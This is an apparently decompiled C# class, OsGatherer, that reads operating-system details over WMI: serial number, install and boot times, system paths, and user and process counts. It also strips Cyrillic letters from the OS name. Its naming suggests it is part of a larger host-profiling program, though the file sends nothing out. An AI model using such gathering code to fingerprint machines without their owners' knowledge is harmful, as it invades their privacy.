using System;

namespace NoiseMe.Drags.App.Data.WMI
{
	public static class OsGatherer
	{
		private static string ClearEmpties(string input)
		{
			string[] value = input.Trim().Split(new char[1]
			{
				' '
			}, StringSplitOptions.RemoveEmptyEntries);
			return string.Join(" ", value);
		}

		private static string ClearRussian(string input)
		{
			string text = string.Empty;
			for (int i = 0; i < input.Length; i++)
			{
				char c = input[i];
				if (!"йцукенгшщзхъфывапролджэячсмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ".Contains(c.ToString()))
				{
					text += c.ToString();
				}
			}
			return ClearEmpties(text);
		}

		public static string GetCaption()
		{
			return ClearRussian(WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "Caption"));
		}

		public static string GetOSArchitecture()
		{
			if (!PlatformHelper.Is64Bit)
			{
				return "x32 Bit";
			}
			return "x64 Bit";
		}

		public static string GetSerialNumber()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "SerialNumber");
		}

		public static DateTime? GetInstallDate()
		{
			return WmiInstance.PropertyQuery<DateTime?>("Win32_OperatingSystem", "InstallDate");
		}

		public static DateTime? GetLastBootUpTime()
		{
			return WmiInstance.PropertyQuery<DateTime?>("Win32_OperatingSystem", "LastBootUpTime");
		}

		public static DateTime? GetLocalDateTime()
		{
			return WmiInstance.PropertyQuery<DateTime?>("Win32_OperatingSystem", "LocalDateTime");
		}

		public static string GetBootDevice()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "BootDevice");
		}

		public static string GetSystemDevice()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "SystemDevice");
		}

		public static string GetSystemDrive()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "SystemDrive");
		}

		public static string GetSystemDirectory()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "SystemDirectory");
		}

		public static string GetWindowsDirectory()
		{
			return WmiInstance.PropertyQuery<string>("Win32_OperatingSystem", "WindowsDirectory");
		}

		public static uint? GetNumberOfUsers()
		{
			return WmiInstance.PropertyQuery<uint?>("Win32_OperatingSystem", "NumberOfUsers");
		}

		public static uint? GetNumberOfProcesses()
		{
			return WmiInstance.PropertyQuery<uint?>("Win32_OperatingSystem", "NumberOfProcesses");
		}
	}
}
